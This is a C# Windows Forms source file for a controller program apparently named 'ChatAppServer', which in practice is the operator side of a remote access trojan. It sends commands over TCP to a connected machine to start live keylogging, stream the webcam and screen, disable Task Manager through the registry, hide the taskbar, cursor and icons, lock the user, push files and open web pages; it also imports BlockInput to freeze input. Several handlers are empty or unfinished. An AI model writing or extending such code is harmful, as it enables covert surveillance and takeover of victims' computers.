using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Speech.Synthesis;
using DevExpress.Utils.MVVM.Services;
using DevExpress.Utils.Win;
using DevExpress.Xpf.Bars;
using DevExpress.XtraEditors;


namespace ChatAppServer
{
    public partial class ChatAppServer : DevExpress.XtraEditors.XtraForm
    {
        XtraUserControl1 userControl1 = new XtraUserControl1();
        string name;

        delegate void SetTextCallback(string text);

        TcpListener listener;
        TcpClient client;
        NetworkStream ns;
        Thread t = null;

        private bool toggleDesktopIcons = true;
        private bool toggleTaskbar = true;
        private bool toggleCursor = true;
        private bool toggleChat = true;
        private bool toggleTaskmanager = true;
        private bool toggleKeyLogging = true;
        private bool toggleCDTray = true;
        private bool toggleCam = true;
        private bool toggleScreen = true;

        private int ttsVolume = 100;
        private int ttsRate = -2;

        Image LastImageReceived = null; // Last correctly received image
        Thread Receiver;
        private bool stopCam = false;

        ASCIIEncoding ByteConverter = new ASCIIEncoding();
            // Object for converting strings to byte arrays and vice versa

        System.Windows.Forms.OpenFileDialog openFileDialog;
        private string sendingFilePath = string.Empty;
        private const int BufferSize = 1024;

        Thread th_liveKeylogging;
        private bool stopLiveKeylogging = false;

        private Thread th_changeWallpaper;
        private Thread th_captureScreen;

        public ChatAppServer()
        {
            DevExpress.XtraEditors.XtraDialog.Show(userControl1, "Connection", MessageBoxButtons.OKCancel);
            name = userControl1.GetName();

            InitializeComponent();

            listener = new TcpListener(int.Parse(userControl1.GetPort()));
            listener.Start();
            client = listener.AcceptTcpClient();
            ns = client.GetStream();
            byte[] bytes = new byte[1024];
            int bytesRead = ns.Read(bytes, 0, bytes.Length);
            string m = Encoding.ASCII.GetString(bytes, 0, bytesRead);
            Text = m;

            String s = name;
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            t = new Thread(DoWork);
            t.Start();
        }

        public void DoWork()
        {
            keyloggongFlyoutPanel.Text = "Waiting for client...";
            keyloggongFlyoutPanel.Show();
            byte[] bytes = new byte[1024];
            while (true)
            {

                int bytesRead = ns.Read(bytes, 0, bytes.Length);
                string message = Encoding.ASCII.GetString(bytes, 0, bytesRead);
                if (message.CompareTo("Connected") == 0)
                {
                    toastNotificationsManager1.ShowNotification(toastNotificationsManager1.Notifications[0]);
                    break;
                }
                else if ((message.EndsWith("-TEXT")))
                {
                    string[] words = message.Split('-');
                    this.SetText(words[0]);
                    
                }
                    
                    //break; //MessageBox.Show(Encoding.ASCII.GetString(bytes, 0, bytesRead));
            }
        }

        private void SetText(string text)
        {

            if (textEdit1.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] {text});
            }
            else
            {
                string[] words = text.Split('-');
                memoEdit1.Text += words[0] + "\r\n";
                memoEdit1.SelectionStart = Int32.MaxValue;
                memoEdit1.ScrollToCaret();
            }
        }
        private void SetKey(string text)
        {

            if (memoEdit2.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetKey);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                memoEdit2.Text += text;
                memoEdit2.SelectionStart = Int32.MaxValue;
                memoEdit2.ScrollToCaret();
            }
        }

        private void textEdit1_KeyDown(object sender, KeyEventArgs e)
        {
            if ((e.KeyCode == Keys.Return))
            {
                String s = name + ": " + textEdit1.Text + "-TEXT";
                string[] words = s.Split('-');
                memoEdit1.Text += words[0] + "\r\n";
                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);

                textEdit1.ResetText();
            }
        }

        private void ChatAppServer_Load(object sender, EventArgs e)
        {
            /*Point pt = this.Location;
            pt.Offset(this.Width / 2, this.Height / 2);
            radialMenu1.ShowPopup(pt);*/

        }

        private void ejectButton_Click(object sender, EventArgs e)
        {
            String s = "EJECTCD";

            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            String s = "CLOSECD";

            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void msgBoxButton_Click(object sender, EventArgs e)
        {
            
        }

        private void shutdownButton_Click(object sender, EventArgs e)
        {
            String s = "CLOSECD";

            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void unfreezeMouseButton1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.End)
            {
                MessageBox.Show("sdfas");
            }
        }

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        public static void FreezeMouse()
        {
            BlockInput(true);
        }

        public static void ThawMouse()
        {
            BlockInput(false);
        }

        private void ChatAppServer_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.End)
            {
                MessageBox.Show("sdfas");
            }
        }

        private void toggleCursorButton_Click(object sender, EventArgs e)
        {
            
        }

        private void toggleIconsButton_Click(object sender, EventArgs e)
        {
            
        }

        private void toggleTaskbarButton_Click(object sender, EventArgs e)
        {
            
        }

        private void lockUserButton_ItemClick(object sender, ItemClickEventArgs e)
        {
            String s = "LOCKUSER";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void chatButton_Click(object sender, EventArgs e)
        {
            
        }

        private void killButton_Click(object sender, EventArgs e)
        {

            
        }

        static FileInfo[] images;
        static int currentImage = 0;

        private void nextWallpaperButton_Click(object sender, EventArgs e)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(@"C:\Users\Faizi\Desktop\New folder (7)");
            images = dirInfo.GetFiles("*.jpg", SearchOption.TopDirectoryOnly);
            Bitmap bm = new Bitmap(Image.FromFile(images[currentImage].Name));
            bm.Save("pic" + currentImage + ".bmp", ImageFormat.Bmp);
            SetImage(@"C:\Users\Faizi\Desktop\New folder (7)\pic" + currentImage + ".bmp");
            currentImage++;
        }

        private static string GetCurrentWallpaperPath()
        {
            RegistryKey wallPaper = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", false);
            string WallpaperPath = wallPaper.GetValue("WallPaper").ToString();
            wallPaper.Close();
            return WallpaperPath;
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 uiAction, UInt32 uiParam, String pvParam, UInt32 fWinIni);

        private static UInt32 SPI_SETDESKWALLPAPER = 20;
        private static UInt32 SPIF_UPDATEINIFILE = 0x1;
        private static String imageFileName = "c:\\test\\test.bmp";



        private static void SetImage(string filename)
        {
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, filename, SPIF_UPDATEINIFILE);
        }

        private void SendTTSButton_Click(object sender, EventArgs e)
        {
            if (ttsTextEdit.Text != "")
            {
                string gender;

                if (speechGenderRadioGroup.SelectedIndex == 0)
                {
                    gender = "Male";
                }
                else
                {
                    gender = "Female";
                }

                String s = gender + "/" + ttsTextEdit.Text + "/" + ttsVolume + "/" + ttsRate + "/" + "TTS";

                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);
            }
            else
            {
                MessageBox.Show("Enter any text");
            }
        }

        private void ttsVolTrackBar_EditValueChanged(object sender, EventArgs e)
        {
            ttsVolume = ttsVolTrackBar.Value;
        }

        private void ttsRateTrackBar_EditValueChanged(object sender, EventArgs e)
        {
            ttsRate = ttsRateTrackBar.Value;
        }

        private void toggleTaskmanagerButton_Click(object sender, EventArgs e)
        {
            
        }

        public void SetTaskManager(bool enable)
        {

            /*string user = Environment.UserDomainName + "\\" + Environment.UserName;
            RegistryAccessRule rule = new RegistryAccessRule(user,
                RegistryRights.FullControl,
                AccessControlType.Allow);
            RegistrySecurity security = new RegistrySecurity();
            security.AddAccessRule(rule);
            var key =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Policies\System",
                    RegistryKeyPermissionCheck.ReadWriteSubTree, RegistryRights.FullControl);
            key.SetAccessControl(security);*/

            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
                objRegistryKey.DeleteValue("DisableTaskMgr");
            else
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            objRegistryKey.Close();
        }

        private void captureCamButton_Click(object sender, EventArgs e)
        {
            String s = "CAPTURECAM";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            Receiver = new Thread(new ThreadStart(Receive));
            Receiver.Start();
        }

        private void stopCamButton_Click(object sender, EventArgs e)
        {
            stopCam = true;
            String s = "STOPCAM";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            Receiver.Abort();

        }

        private void Receive()
        {
            // Port ip has the form "port-ip"
            /*string[] Parameter = portip.ToString().Split('-');
            System.Net.IPAddress IP = System.Net.IPAddress.Parse(Parameter[1]);

            TcpClient Exchange = new TcpClient();
            NetworkStream ExchangeStream = null;*/

            Image TempImage;

            // Every 3 seconds trying to connect
            /*while (true)
            {
                try
                {
                    ns = client.GetStream();
                    break;
                }
                catch
                {
                    Thread.Sleep(3000);
                }
            }*/
            //camFlyoutPanel.Show();
            //camFlyoutPanel.Visible = true;

            while (true)
            {
                if (stopCam)
                    break; // termination

                try
                {
                    // Try to read the received image
                    // if successful
                    TempImage = ReadImage(ns);
                    if (TempImage == null)
                        throw new Exception();

                    pictureBoxVideoPartner.BackgroundImage = TempImage;
                    LastImageReceived = (Image) pictureBoxVideoPartner.BackgroundImage.Clone();
                    Thread.Sleep(100);
                }
                catch
                {
                    try
                    {
                        // In case of error the backup image
                        pictureBoxVideoPartner.BackgroundImage = LastImageReceived;
                    }
                    catch
                    {
                    }
                }
            }
        }

        private Image ReadImage(NetworkStream stream)
        {
            Image Result;
            int BytesRead;

            // The first 20 bytes of the stream, because in these the size is encoded
            byte[] ImageSize = new byte[20];
            BytesRead = stream.Read(ImageSize, 0, 20);

            /* Only 12 bytes could be read and these have the contents of the
            Closing strings, so should be terminated */
            if (BytesRead == 12)
            {
                if (ByteConverter.GetString(ImageSize, 0, 12) == "FORM#CLOSING")
                {
                    stopCam = true;
                    return null;
                }
            }

            byte[] ErrorBuffer = new byte[100000000];

            ASCIIEncoding Decoder = new ASCIIEncoding();
            string ImageSizeString = Decoder.GetString(ImageSize).Replace("x", "");

            int TestSize;

            if (!int.TryParse(ImageSizeString, out TestSize))
            {
                stream.Read(ErrorBuffer, 0, ErrorBuffer.Length);
                return null;
            }

            byte[] ImageFile = new byte[int.Parse(ImageSizeString)];

            stream.Read(ImageFile, 0, ImageFile.Length);

            MemoryStream temps = new MemoryStream();

            try
            {
                temps.Write(ImageFile, 0, ImageFile.Length);
                Result = Image.FromStream(temps);
                return Result;
            }
            catch
            {
                return null;
            }
        }

        private void openWebButton_Click(object sender, EventArgs e)
        {
            if (webAddressTextEdit.Text != "")
            {
                String s;
                s = webAddressTextEdit.Text + "-OPENWEB";
                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);
            }
            else
            {
                XtraMessageBox.Show("Enter a web address");
            }
        }

        private void sendFileButton_Click(object sender, EventArgs e)
        {
            String s = "RECEIVEFILE";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            byte[] SendingBuffer = null;
            //TcpClient client = null;
            lblStatus.Text = "";
            //NetworkStream netstream = null;
            if (sendingFilePath != string.Empty)
            {
                
                try
                {
                   // client = new TcpClient(IPA, PortN);
                    lblStatus.Text = "Connected to the Client...\n";
                    //netstream = client.GetStream();
                    FileStream Fs = new FileStream(sendingFilePath, FileMode.Open, FileAccess.Read);
                    int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(BufferSize)));
                    progressBar1.Maximum = NoOfPackets;
                    int TotalLength = (int)Fs.Length, CurrentPacketLength, counter = 0;
                    for (int i = 0; i < NoOfPackets; i++)
                    {
                        if (TotalLength > BufferSize)
                        {
                            CurrentPacketLength = BufferSize;
                            TotalLength = TotalLength - CurrentPacketLength;
                        }
                        else
                            CurrentPacketLength = TotalLength;
                        SendingBuffer = new byte[CurrentPacketLength];
                        Fs.Read(SendingBuffer, 0, CurrentPacketLength);
                        ns.Write(SendingBuffer, 0, (int)SendingBuffer.Length);
                        if (progressBar1.Value >= progressBar1.Maximum)
                            progressBar1.Value = progressBar1.Minimum;
                        progressBar1.PerformStep();
                    }

                    lblStatus.Text = lblStatus.Text + "Sent " + Fs.Length.ToString() + " bytes to the server";
                    Fs.Close();
                    //netstream.Close();


                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }

                
            }
            else
            {
                XtraMessageBox.Show("Select a file.");
            }
        }

        private void browseFileButton_Click(object sender, EventArgs e)
        {
            openFileDialog = new System.Windows.Forms.OpenFileDialog();
            openFileDialog.Filter = "All Files (*.*)|*.*";
            openFileDialog.CheckFileExists = true;
            openFileDialog.Title = "Choose a File";
            openFileDialog.InitialDirectory = @"C:\";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                sendingFilePath = openFileDialog.FileName;
                fileLinkLabel.Text = sendingFilePath;
            }
        }

        private void liveKeyloggingButton_Click(object sender, EventArgs e)
        {
            
        }

        private void LiveKeylogging()
        {
            //LiveKeyloggingControl liveKeyloggingControl=new LiveKeyloggingControl();
            //DevExpress.XtraEditors.XtraDialog.Show(liveKeyloggingControl, "Live Keylogging", MessageBoxButtons.OKCancel);

            byte[] bytes = new byte[1024];
            while (true)
            {

                int bytesRead = ns.Read(bytes, 0, bytes.Length);
                string message = Encoding.ASCII.GetString(bytes, 0, bytesRead);
                if (!stopLiveKeylogging)
                {
                    //liveKeyloggingControl.MemoEdit.Text += message;//this.SetKey(message);
                    //memoEdit2.Text += message;
                    this.SetKey(message);
                }
                else
                {
                    break;
                }
            }
            //liveKeyLoggingForm.Dispose();
            th_liveKeylogging.Abort();
            stopLiveKeylogging = false;
        }

        private void simpleButton1_Click(object sender, EventArgs e)
        {
            Point pt = this.Location;
            pt.Offset(this.Width / 2, this.Height / 2);
            radialMenu1.ShowPopup(pt);
        }

        private void shutdownButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s = "CLOSECD";

            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void lockUserButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s = "LOCKUSER";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void toggleIconsButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            if (toggleDesktopIcons)
            {
                toggleIconsButton.Caption = "Show Desktop Icons";
                toggleDesktopIcons = false;
            }
            else
            {
                toggleIconsButton.Caption = "Hide Desktop Icons";
                toggleDesktopIcons = true;
            }
            String s = "TOGGLEICONS";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void toggleTaskbarButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleTaskbar)
            {
                s = "HIDETASKBAR";
                toggleTaskbarButton.Caption = "Show Taskbar";
                toggleTaskbar = false;
            }
            else
            {
                s = "SHOWTASKBAR";
                toggleTaskbarButton.Caption = "Hide Taskbar";
                toggleTaskbar = true;
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void msgBoxButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            MessageBoxControls messageBoxControls = new MessageBoxControls();
            DevExpress.XtraEditors.XtraDialog.Show(messageBoxControls, "MessageBox Editor", MessageBoxButtons.OKCancel);

            int button = messageBoxControls.MessageBoxButtons;
            int icon = messageBoxControls.MessageBoxIcon;
            string title = messageBoxControls.TitleTextEdit;
            string message = messageBoxControls.MemoEdit1;

            String s = message + "-" + title + "-" + button + "-" + icon + "-" + "MESSAGE";
            //memoEdit1.Text += ss;


            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void liveKeyloggingButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleKeyLogging)
            {

                keyloggongFlyoutPanel.FlyoutPanel.OwnerControl = this;
                flyoutPanel1.Options.AnchorType=PopupToolWindowAnchor.TopRight;
                keyloggongFlyoutPanel.FlyoutPanel.ShowPopup();
                s = "LIVEKEYLOGGING";
                stopLiveKeylogging = false;
                liveKeyloggingButton.Caption = "Stop Keylogging";
                toggleKeyLogging = false;

                th_liveKeylogging = new Thread(new ThreadStart(LiveKeylogging));
                th_liveKeylogging.Start();

                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);

            }
            else
            {
                keyloggongFlyoutPanel.FlyoutPanel.HidePopup();
                s = "STOPLIVEKEYLOGGING";
                stopLiveKeylogging = true;
                liveKeyloggingButton.Caption = "Live Keylogging";
                toggleKeyLogging = true;

                byte[] byteTime = Encoding.ASCII.GetBytes(s);
                ns.Write(byteTime, 0, byteTime.Length);
            }
        }

        private void ttsButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            ttsFlyoutPanel.FlyoutPanel.OwnerControl = this;
            flyoutPanel2.Options.AnchorType = PopupToolWindowAnchor.TopRight;
            flyoutPanel2.Options.CloseOnOuterClick = true;
            ttsFlyoutPanel.FlyoutPanel.ShowPopup();
        }

        private void openWebButtonItem_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            openWebFlyoutPanel.FlyoutPanel.OwnerControl = this;
            flyoutPanel3.Options.AnchorType = PopupToolWindowAnchor.TopRight;
            flyoutPanel3.Options.CloseOnOuterClick = true;
            openWebFlyoutPanel.FlyoutPanel.ShowPopup();
        }

        private void chatButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleChat)
            {
                chatFlyoutPanel.FlyoutPanel.OwnerControl = this;
                flyoutPanel4.Options.AnchorType = PopupToolWindowAnchor.TopLeft;
                chatFlyoutPanel.FlyoutPanel.ShowPopup();
                textEdit1.Focus();
                s = "ONCHAT";
                chatButton.Caption = "Close Chat";
                toggleChat = false;

                memoEdit1.Enabled = true;
                textEdit1.Enabled = true;
                textEdit1.Focus();}
            else
            {
                chatFlyoutPanel.FlyoutPanel.HidePopup();
                s = "OFFCHAT";
                chatButton.Caption = "Chat";
                toggleChat = true;
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void killButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s = "KILL";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
            //client.Close();
            //ns.Close();
        }

        private void toggleTaskmanagerButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleTaskmanager)
            {
                //SetTaskManager(false);
                s = "DISABLETASKMANAGER";
                toggleTaskmanagerButton.Caption = "Enable Task Manager";
                toggleTaskmanager = false;
            }
            else
            {
                //SetTaskManager(true);
                s = "ENABLETASKMANAGER";
                toggleTaskmanagerButton.Caption = "Disable Task Manager";
                toggleTaskmanager = true;
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void toggleCursorButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleCursor)
            {
                s = "HIDECURSOR";
                toggleCursorButton.Caption = "Show Cursor";
                toggleCursor = false;
            }
            else
            {
                s = "SHOWCURSOR";
                toggleCursorButton.Caption = "Hide Cursor";
                toggleCursor = true;
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void toggleCDTrayButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleCDTray)
            {
                s = "EJECTCD";
                toggleCDTrayButton.Caption = "Close CD Tray";
                toggleCDTray = false;
            }
            else
            {
                s = "CLOSECD";
                toggleCDTrayButton.Caption = "Eject CD Tray";
                toggleCDTray = true;
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void toggleCamButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            String s;
            if (toggleCam)
            {
                camFlyoutPanel.FlyoutPanel.OwnerControl = this;
                flyoutPanel5.Options.AnchorType = PopupToolWindowAnchor.TopLeft;
                camFlyoutPanel.FlyoutPanel.ShowPopup();

                s = "CAPTURECAM";
                toggleCamButton.Caption = "Stop Capturing Cam";
                toggleCam = false;

                Receiver = new Thread(new ThreadStart(Receive));
                Receiver.Start();
            }
            else
            {
                camFlyoutPanel.FlyoutPanel.HidePopup();

                stopCam = true;

                s = "STOPCAM";
                toggleCamButton.Caption = "Capture Cam";
                toggleCam = true;

                Receiver.Abort();
            }
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }

        private void changeWallpaperButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            th_changeWallpaper = new Thread(new ThreadStart(ChangeWallpaper));
            th_changeWallpaper.Start();

            
        }

        public void ChangeWallpaper()
        {


            /*byte[] buffer = File.ReadAllBytes("1.jpg");
            client.Send(buffer, buffer.Length, SocketFlags.None);
            Console.WriteLine("Send success!");

            String s = "CHANGEWALLPAPER";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
            ns.Write(bStream, 0, bStream.Length);*/

                
            System.Threading.Thread.Sleep(1000);
                //ns.Close();
                //th_changeWallpaper.Abort();
            
        }
        static byte[] ImageToByte(System.Drawing.Image iImage)
        {
            MemoryStream mMemoryStream = new MemoryStream();
            iImage.Save(mMemoryStream, System.Drawing.Imaging.ImageFormat.Gif);
            return mMemoryStream.ToArray();
        }

        void CaptureScreen()
        {
            Image TempImage;

           
            screenPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
            while (true)
            {
                //if (stopCam)
                    //break; // termination

                try
                {
                    // Try to read the received image
                    // if successful
                    TempImage = ReadImage(ns);
                    if (TempImage == null)
                        throw new Exception();

                    screenPictureBox.BackgroundImage = ResizeImage(TempImage,screenPictureBox.Width,screenPictureBox.Height);
                    LastImageReceived = (Image)screenPictureBox.BackgroundImage.Clone();
                    Thread.Sleep(100);
                }
                catch
                {
                    try
                    {
                        // In case of error the backup image
                        screenPictureBox.BackgroundImage = ResizeImage(LastImageReceived, screenPictureBox.Width, screenPictureBox.Height); ;
                    }
                    catch
                    {
                    }
                }
            }

        }

        public static Bitmap ResizeImage(Image image, int width, int height)
        {
            var destRect = new Rectangle(0, 0, width, height);
            var destImage = new Bitmap(width, height);

            destImage.SetResolution(image.HorizontalResolution, image.VerticalResolution);

            using (var graphics = Graphics.FromImage(destImage))
            {
                graphics.CompositingMode = CompositingMode.SourceCopy;
                graphics.CompositingQuality = CompositingQuality.HighQuality;
                graphics.InterpolationMode = InterpolationMode.HighQualityBicubic;
                graphics.SmoothingMode = SmoothingMode.HighQuality;
                graphics.PixelOffsetMode = PixelOffsetMode.HighQuality;

                using (var wrapMode = new ImageAttributes())
                {
                    wrapMode.SetWrapMode(WrapMode.TileFlipXY);
                    graphics.DrawImage(image, destRect, 0, 0, image.Width, image.Height, GraphicsUnit.Pixel, wrapMode);
                }
            }

            return destImage;
        }

        private void toggleScreenButton_ItemClick(object sender, DevExpress.XtraBars.ItemClickEventArgs e)
        {
            screenFlyoutPanel.FlyoutPanel.OwnerControl = this;
            flyoutPanel6.Options.AnchorType = PopupToolWindowAnchor.Center;
            screenFlyoutPanel.FlyoutPanel.ShowPopup();

            String s = "CAPTURESCREEN";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);

            th_captureScreen = new Thread(new ThreadStart(CaptureScreen));
            th_captureScreen.Start();
        }

        private void stopScreenButton_Click(object sender, EventArgs e)
        {
            screenFlyoutPanel.FlyoutPanel.HidePopup();
            th_captureScreen.Abort();

            String s = "STOPCAPTURESCREEN";
            byte[] byteTime = Encoding.ASCII.GetBytes(s);
            ns.Write(byteTime, 0, byteTime.Length);
        }
    }
}
